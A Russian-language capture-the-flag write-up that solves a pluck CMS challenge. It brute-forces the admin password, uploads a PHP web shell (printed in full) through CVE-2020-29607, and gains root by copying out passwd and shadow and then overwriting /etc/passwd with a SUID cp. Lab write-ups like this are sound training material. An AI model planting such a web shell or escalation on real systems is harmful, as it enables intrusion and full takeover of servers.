### Writeup`s QUEST:
___

#### Подземелье:moyai:: 
<details><summary></summary>
Описание: 

>"Мой друг разработал сайт на одном непопулярном движке. Проверь, достаточно ли он защищен. Задание перезапускается в начале каждого часа."

Что у нас есть:
* 62.173.140.174:18000 - сервис pluck
* 62.173.140.174:18022 - ssh

Проанализируем 62.173.140.174:18000. Обычно при решении таких тасков, когда дан какой-то сервис по типу Wordpress или как в данном случае pluck, стоит узнать версию и погуглить уже известную CVE, что мы и сделаем.

CVE-2020–29607 - то что удалось отыскать. Разберем, в чем же заключается уязвимость. Из описания CVE следует - Загрузка файла, Удаленное выполнение кода (с проверкой подлинности). О чем это говорит, что пользователь с правами администратора pluck может загрузить файл с вредоносным кодом, что может привести к удаленному выполнению кода.

Еще погуглив, я нашел [гайд](https://loopspell.medium.com/cve-2020-29607-remote-code-execution-via-file-upload-restriction-bypass-f5cff38d94c6), как использовать эту уязвимость. Осталось только получить права администратора в pluck.
При переходе сюда http://62.173.140.174:18000/login.php нас встречает поле для ввода пароля.

Первая мысль которая у меня появилась - брутить пароль для входа, что я и сделал с помощью intruder в BurpSuite. Оказалось, что паролем являлось слово "liverpool".

Что же дальше?
Выполняем действия, как и в [гайде](https://loopspell.medium.com/cve-2020-29607-remote-code-execution-via-file-upload-restriction-bypass-f5cff38d94c6) и загружаем web-shell.

Файл vuln.phar выглядел у меня следующим образом
```
<!----!>-->
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```
Good job! Мы получили web-shell, с поощью которого можно узнать пароль для ssh. Пользователь, как выяснилось john.

Идем дальше.
После подключения по ssh, изучив немного директории, несложно понять, что флаг лежит в /root, куда у нас нет доступа.

Чтож, займемся повышением привилегий.
Читая и разбираясь нашел прикольную [статейку на habr`е](https://habr.com/ru/companies/jetinfosystems/articles/506750/).

```
find / -user root -perm -u=s -type f 2>/dev/null
```
Это выведет нам список процессов, которые мы можем запускать от root.

Среди них я нашел cp. Что говорит нам о том, что мы можем копировать passwd и shadow в директорию, из которой с помощью scp потом можем выкачать эти два файла. Имея passwd и shadow, я подумал, что стоит воспользоваться john the ripper. Как выяснилось, не стоит тратить на это время, забрутить хэш пароля у меня не получилось.

Изменим вектор атаки. Поменяем в файле passwd, который у нас есть, для пользователя john id пользователя и группы с 1000 на 0. 
Измененный файл через scp отправляем обратно в атакуемый хост. После чего с помощью cp подменяем файл passwd:

```
cp /home/john/passwd /etc/passwd
```

Таким образом получаем права root. Дальше залетаем в /root и забираем вторую часть флага.
GG
___